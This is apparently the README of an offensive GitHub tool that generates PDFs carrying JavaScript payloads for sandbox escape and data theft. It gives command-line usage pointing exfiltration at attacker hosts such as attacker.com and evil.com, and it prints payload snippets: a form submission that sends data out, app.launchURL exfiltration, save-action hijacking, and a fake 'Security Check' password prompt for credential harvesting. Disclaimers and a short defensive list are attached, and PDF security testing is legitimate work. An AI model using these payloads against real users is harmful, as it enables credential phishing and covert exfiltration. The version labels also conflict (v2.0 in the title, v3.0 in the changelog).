# XSS-PDF Generator v2.0 - Advanced PDF Sandbox Escape Tool

## 🚀 1000+ Sophisticated PDF Sandbox Escape Payloads

A research-grade tool for generating PDF files with sophisticated JavaScript payloads designed to escape PDF sandbox restrictions across all major browser PDF libraries. Features 1000+ distinct payloads targeting Chrome (PDFium), Firefox (PDF.js), Safari (PDFKit), Adobe Reader, and Edge PDF.

## 📁 Project Structure

```
XSS-PDF/
├── PDF/                          # Main PDF generation tools
│   ├── script.py                 # Advanced XSS-PDF Generator v2.0 (1000+ payloads)
│   ├── Another-Script.py         # Browser-specific PDF generator
│   └── Files/                    # Generated PDF files output directory
├── README.md                     # This file
└── other files...
```

## ⚠️ Legal Disclaimer

This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.

## 🎯 Research-Based Payload Database

### Browser-Specific Targeting
- **Chrome (PDFium)**: 200+ targeted exploits with V8 engine abuse and IPC manipulation
- **Firefox (PDF.js)**: 200+ CSP bypass techniques and SpiderMonkey exploitation  
- **Safari (PDFKit)**: 200+ macOS-specific exploits with WebKit integration
- **Adobe Reader**: 250+ full JavaScript API exploitation
- **Edge PDF**: 150+ Windows integration exploits

### Extensive Research Base
- **50+ CVE References** across all PDF rendering libraries
- **Academic Papers** on PDF security and sandbox escapes
- **Bug Bounty Reports** from major platforms
- **Security Conference Presentations**
- **PDF Rendering Library Source Code Analysis**

## 🔒 Sophisticated Sandbox Escape Features

### Advanced PDF Structure
- **Multiple JavaScript Execution Vectors**: OpenAction, Page Actions, Form Events, Timeouts
- **Browser-Optimized PDF Objects**: Different PDF versions and structures per browser
- **Enhanced Cross-Reference Tables**: Proper offset calculations and object references
- **Font Resources**: Complete font dictionaries to prevent rendering issues
- **Complete Payload Visibility**: Full payload content displayed in PDF for reference
- **Filename Integration**: PDF filename shown as heading for easy identification

### OS-Aware File System Targeting
- **Windows**: Targets `C:\Windows\System32\`, `C:\Users\`, etc.
- **macOS**: Targets `/Applications/`, `/Users/`, `/System/`, etc.
- **Linux**: Targets `/etc/passwd`, `/home/`, `/usr/bin/`, etc.
- **Android**: Targets `/system/`, `/data/`, Android-specific paths
- **Automatic Detection**: Scripts detect running OS and use appropriate file paths

### Enhanced Security & Compatibility
- **Parent Object Checks**: All payloads include proper checks for `parent`, `top`, `frames` objects
- **Cross-Browser Compatibility**: Handles different JavaScript contexts safely
- **Error Handling**: Graceful fallbacks when objects are undefined

### Payload Categories
- **DOM Access**: Browser DOM manipulation from PDF context
- **File System**: Local file access and directory traversal
- **Command Execution**: System command execution and process spawning
- **Sandbox Escape**: PDF sandbox restriction bypasses  
- **Network Exfiltration**: Data exfiltration and covert channels

## 🚀 Features

- **1000+ Distinct Payloads**: Comprehensive collection targeting all major PDF libraries
- **Browser-Specific Optimization**: PDF structures optimized for each rendering engine
- **Advanced Payload Obfuscation**: Base64, Unicode, Hex encoding with fallback mechanisms
- **URL Integration**: Complete URL replacement in all applicable payloads
- **Category Filtering**: Target specific attack vectors (DOM, file system, command execution)
- **JSON Database Export**: Export payload database with metadata and CVE references
- **Verbose Logging**: Detailed payload information and technique descriptions
- **CVE Reference Integration**: Each payload linked to relevant security vulnerabilities

## 📋 Usage Examples

### Basic Usage
```bash
# Navigate to the PDF directory
cd PDF

# Generate Chrome-specific payloads
python3 script.py -b chrome -u http://attacker.com/collect

# Generate all browser payloads with data exfiltration
python3 script.py -b all -u https://webhook.site/xyz

# Target specific payload category
python3 script.py -b firefox --category file_system -u http://evil.com

# Limit number of payloads generated
python3 script.py -b adobe --count 50 -u http://collector.com
```

### Advanced Usage
```bash
# Navigate to the PDF directory first
cd PDF

# Export payload database as JSON
python3 script.py -b all --output-json

# Verbose output with payload details
python3 script.py -b safari -u http://test.com -v

# List research sources and CVE references
python3 script.py --list-research

# Filter by specific categories
python3 script.py -b chrome --category command_execution -u http://log.site

# Use the alternative script for browser-specific PDFs
python3 Another-Script.py -b chrome -u http://test.com
```

## 🎯 Browser Targets

| Browser | PDF Library | Payload Count | Focus Areas |
|---------|------------|---------------|-------------|
| Chrome | PDFium | 200+ | V8 engine exploitation, IPC abuse, process injection |
| Firefox | PDF.js | 200+ | CSP bypass, SpiderMonkey exploitation, Content Security Policy evasion |
| Safari | PDFKit | 200+ | macOS integration, WebKit messageHandlers, Objective-C bridge abuse |
| Adobe | Acrobat/Reader | 250+ | Full JavaScript API, privilege escalation, file system access |
| Edge | Edge PDF | 150+ | Windows integration, WebView exploitation, registry manipulation |

## 📊 Payload Categories

| Category | Description | Example Techniques |
|----------|-------------|-------------------|
| `dom_access` | Browser DOM manipulation from PDF context | parent.window.location, postMessage abuse |
| `file_system` | Local file system access and directory traversal | file:// URI manipulation, browseForDoc() |
| `command_execution` | System command execution and process spawning | Protocol handler abuse, ms-msdt exploitation |
| `sandbox_escape` | PDF sandbox restriction bypasses | IPC manipulation, memory corruption |
| `network_exfiltration` | Data exfiltration and covert channels | Form submission, XMLHttpRequest alternatives |

## 🛠️ Installation & Requirements

### Requirements
- Python 3.x
- No external dependencies required (uses only standard library)

### Installation
```bash
git clone https://github.com/SNGWN/XSS-PDF.git
cd XSS-PDF/PDF  # Note: Scripts are now in the PDF folder
```

## 📖 Usage

### Basic Commands

```bash
# Navigate to the PDF directory
cd PDF

# Show help and available options
python3 script.py --help

# List all available XSS payload types
python3 script.py --list-types

# Generate basic PDF files (backward compatibility)
python3 script.py -o pdf

# Generate specific XSS payload type
python3 script.py -t alert

# Generate all XSS payload types
python3 script.py -t all

# Generate HTML XSS test file
python3 script.py -o html
```

### Advanced PDF Sandbox Escape Usage

```bash
# Navigate to PDF directory first
cd PDF

# PDF data exfiltration via form submission escape
python3 script.py -t cookie -u http://attacker.com/collect

# PDF action-based sandbox escape
python3 script.py -t action -u http://collaborator.burpsuite.com

# PDF dialog manipulation for credential harvesting
python3 script.py -t dialog -u http://logger.example.com

# PDF file system escape attempts
python3 script.py -t file

# Generate all PDF sandbox escape types
python3 script.py -t all -u http://collaborator.burpsuite.com

# PDF network escape via URL launching
python3 script.py -t network -u https://webhook.site/unique-id
```

## 🏁 Command Line Flags

| Flag | Long Form | Description | Example |
|------|-----------|-------------|---------|
| `-h` | `--help` | Show help message | `python3 script.py --help` |
| `-u` | `--url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
| `-o` | `--output` | Output format (pdf/html) | `-o pdf` |
| `-s` | `--script` | Custom JavaScript payload | `-s "app.alert('test')"` |
| `-t` | `--type` | XSS payload type or 'all' | `-t cookie` |
| | `--list-types` | List available payload types | `--list-types` |

## 📁 Output Files

### PDF Files
**All generated PDF files are automatically stored in a `Files/` directory.**

The tool creates the `Files` directory automatically if it doesn't exist. Generated PDF files follow the naming convention: `xss_<type>_<timestamp>.pdf`

Examples:
- `Files/xss_alert_20240115_143022.pdf`
- `Files/xss_cookie_20240115_143025.pdf`
- `Files/xss_custom_20240115_143030.pdf`

### HTML Files
Generated HTML files follow the naming convention: `xss_test_<timestamp>.html`

Example:
- `xss_test_20240115_143035.html`

## 🎯 PDF Sandbox Escape Examples

### PDF Form Submission Escape
```javascript
// PDF-specific data exfiltration
this.submitForm({
    cURL: "http://attacker.com/collect",
    cSubmitAs: "HTML",
    cCharset: "utf-8"
});
```

### PDF URL Launching Escape
```javascript
// Escape sandbox via URL launching
app.launchURL("http://attacker.com/escape?data=" + encodeURIComponent(data), true);
```

### PDF Action Hijacking
```javascript
// Hijack document actions for persistent escape
this.setAction("WillSave", 
    "app.launchURL('http://attacker.com/save-intercept', true);"
);
```

### PDF Dialog Exploitation
```javascript
// Credential harvesting via PDF dialogs
var creds = app.response({
    cQuestion: "Enter your credentials:",
    cTitle: "Security Check",
    bPassword: true
});
```

## 🔍 PDF Security Testing Methodology

1. **Generate PDF Test Files**: Use the tool to create PDF files with various sandbox escape payloads
2. **Upload/Embed Testing**: Test file upload functionality on target applications
3. **PDF Viewer Analysis**: Test different PDF viewers (Adobe Reader, browser built-ins, etc.)
4. **Sandbox Escape Monitoring**: Monitor for successful escapes via URL launching, form submission
5. **Data Exfiltration Testing**: Use URL flag to test actual data extraction capabilities
6. **Action Persistence Testing**: Test if PDF actions persist across viewer sessions
7. **Dialog Security Testing**: Test credential harvesting via PDF dialog manipulation

## 🛡️ PDF-Specific Defensive Measures

To protect against PDF sandbox escape attacks:

- **Disable PDF JavaScript**: Configure PDF viewers to disable JavaScript execution
- **PDF Upload Restrictions**: Implement strict PDF upload validation and content analysis
- **Sandbox Hardening**: Use additional sandboxing layers beyond PDF viewer defaults
- **Network Monitoring**: Monitor for unusual outbound connections from PDF viewer processes
- **Content Security Policy**: Implement CSP headers that restrict PDF-initiated requests
- **PDF Content Analysis**: Scan uploaded PDFs for JavaScript and suspicious structures
- **User Education**: Train users on PDF security risks and safe viewing practices

## 🚨 Security Considerations

- Always obtain proper authorization before testing
- Use in controlled environments only
- Be aware of legal implications
- Respect responsible disclosure practices
- Monitor and log all testing activities

## 📈 Changelog

### Version 3.0 (Current) - PDF Sandbox Escape Enhancement
- **Complete rewrite for PDF sandbox context**
- **PDF-specific JavaScript APIs**: Replaced browser APIs with PDF JavaScript
- **12 sophisticated sandbox escape techniques**
- **Enhanced PDF structure**: More complex PDF objects for better escape potential
- **Action-based persistence**: PDF action hijacking for persistent attacks
- **Dialog exploitation**: Credential harvesting via PDF dialogs
- **Form submission escapes**: Data exfiltration via PDF form submission
- **URL launching escapes**: Sandbox escape via app.launchURL()
- **File system escape attempts**: PDF-specific file access methods
- **Comprehensive error handling for PDF context**

### Version 1.0 (Legacy)
- Basic PDF generation with simple XSS payloads
- Limited to 2-3 payload types
- Basic URL and custom script support

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add comprehensive tests
4. Follow existing code style
5. Submit a pull request with detailed description

## 📄 License

This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.

## 🔗 Resources

- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PDF Security Research](https://blog.didierstevens.com/programs/pdf-tools/)
- [JavaScript Security Best Practices](https://developer.mozilla.org/en-US/docs/Web/Security)

---

**Remember**: This tool is for authorized security testing only. Always obtain proper permission before testing any systems.